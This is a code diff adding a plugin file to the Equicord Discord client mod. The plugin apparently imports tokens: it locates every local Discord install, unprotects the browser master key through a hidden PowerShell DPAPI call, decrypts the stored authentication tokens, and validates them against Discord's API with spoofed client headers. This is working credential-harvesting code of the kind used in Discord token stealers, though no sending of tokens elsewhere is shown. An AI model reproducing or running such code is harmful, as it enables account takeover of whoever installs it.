@@ -1,0 +1,166 @@
+/*
+ * Equicord, a Discord client mod
+ * Copyright (c) 2024 Vendicated and contributors
+ * SPDX-License-Identifier: GPL-3.0-or-later
+ */
+
+import { safeStorage } from "electron";
+import { request } from "https";
+import { readFileSync, existsSync, readdirSync } from "fs";
+import { join } from "path";
+import { execFileSync } from "child_process";
+import * as crypto from "crypto";
+
+const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9175 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36";
+const X_SUPER_PROPERTIES = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTc1IiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZX0=";
+
+// Verification token
+export async function checkToken(_: any, token: string): Promise<{ valid: boolean; user?: any; error?: string; }> {
+    return new Promise(resolve => {
+        const req = request({
+            hostname: "discord.com",
+            path: "/api/v9/users/@me",
+            method: "GET",
+            headers: {
+                "Authorization": token,
+                "User-Agent": USER_AGENT,
+                "Content-Type": "application/json",
+                "X-Super-Properties": X_SUPER_PROPERTIES,
+                "X-Discord-Locale": "en-US",
+                "X-Debug-Options": "bugReporterEnabled",
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive",
+            }
+        }, res => {
+            let data = "";
+            res.on("data", (chunk: Buffer) => { data += chunk.toString(); });
+            res.on("end", () => {
+                console.log(`[TokenImporter] Status ${res.statusCode} for token ${token.slice(0, 15)}...`);
+                if (res.statusCode === 200) {
+                    try { resolve({ valid: true, user: JSON.parse(data) }); }
+                    catch { resolve({ valid: false, error: "parse_error" }); }
+                } else if (res.statusCode === 401 || res.statusCode === 403) {
+                    // Token vraiment invalid/révoqué
+                    resolve({ valid: false, error: "unauthorized" });
+                } else if (res.statusCode === 429) {
+                    // Rate limited — pas invalid, juste throttlé
+                    resolve({ valid: false, error: "rate_limited" });
+                } else {
+                    resolve({ valid: false, error: `http_${res.statusCode}` });
+                }
+            });
+        });
+        req.on("error", (e: any) => {
+            console.error("[TokenImporter] req error:", e?.message);
+            resolve({ valid: false, error: "network_error" });
+        });
+        req.setTimeout(15000, () => {
+            req.destroy();
+            console.warn("[TokenImporter] timeout for token", token.slice(0, 15));
+            resolve({ valid: false, error: "timeout" });
+        });
+        req.end();
+    });
+}
+
+// Encryption du token (appele depuis le renderer)
+export async function encryptToken(_: any, token: string): Promise<string | null> {
+    try {
+        if (!safeStorage.isEncryptionAvailable()) return null;
+        const encrypted = safeStorage.encryptString(token);
+        return "dQw4w9WgXcQ:" + encrypted.toString("base64");
+    } catch {
+        return null;
+    }
+}
+
+function decryptDPAPI(encryptedKeyBase64: string): Buffer {
+    const buf = Buffer.from(encryptedKeyBase64, "base64").slice(5);
+    const hexStr = buf.toString("hex");
+    const script = `
+        Add-Type -AssemblyName System.Security
+        $bytes = [object[]]::new(${buf.length})
+        $hex = "${hexStr}"
+        for ($i = 0; $i -lt $hex.Length; $i += 2) {
+            $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
+        }
+        $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        [BitConverter]::ToString($unprotected) -replace '-'
+    `;
+    try {
+        const res = execFileSync("powershell", ["-NoProfile", "-Command", script], {
+            encoding: "utf8",
+            windowsHide: true // Fix brief terminal window appearance
+        });
+        return Buffer.from(res.trim(), "hex");
+    } catch (e: any) {
+        throw e;
+    }
+}
+
+function decryptToken(encryptedBase64: string, masterKey: Buffer): string {
+    const buf = Buffer.from(encryptedBase64, "base64");
+    const iv = buf.subarray(3, 15);
+    const payload = buf.subarray(15);
+    const authTag = payload.subarray(payload.length - 16);
+    const ciphertext = payload.subarray(0, payload.length - 16);
+
+    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
+    decipher.setAuthTag(authTag);
+    let decrypted = decipher.update(ciphertext, undefined, "utf8");
+    decrypted += decipher.final("utf8");
+    return decrypted;
+}
+
+export async function findLocalTokens(): Promise<string[]> {
+    const tokens = new Set<string>();
+    const apps = ["discord", "discordcanary", "discordptb", "discorddevelopment", "lightcord"];
+
+    if (process.platform !== "win32") return [];
+
+    for (const app of apps) {
+        try {
+            const appPath = join(process.env.APPDATA || "", app);
+
+            // Dossiers à scanner pour cette application
+            const scanDirs = [
+                join(appPath, "Local Storage", "leveldb"),
+                join(appPath, "Session Storage")
+            ];
+
+            const localStatePath = join(appPath, "Local State");
+            if (!existsSync(localStatePath)) continue;
+
+            const localState = JSON.parse(readFileSync(localStatePath, "utf8"));
+            const encryptedKey = localState.os_crypt?.encrypted_key;
+            if (!encryptedKey) continue;
+
+            const masterKey = decryptDPAPI(encryptedKey);
+
+            for (const dir of scanDirs) {
+                if (!existsSync(dir)) continue;
+                const files = readdirSync(dir);
+
+                for (const file of files) {
+                    try {
+                        const content = readFileSync(join(dir, file), "latin1");
+                        const matches = content.match(/dQw4w9WgXcQ:[A-Za-z0-9+/=]+/g);
+                        if (matches) {
+                            for (const match of matches) {
+                                try {
+                                    const enc = match.split("dQw4w9WgXcQ:")[1].split('"')[0].split("\\")[0];
+                                    const token = decryptToken(enc, masterKey);
+                                    if (token && /(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})/.test(token)) {
+                                        tokens.add(token);
+                                    }
+                                } catch { }
+                            }
+                        }
+                    } catch (e) { }
+                }
+            }
+        } catch (e) { }
+    }
+    return Array.from(tokens);
+}
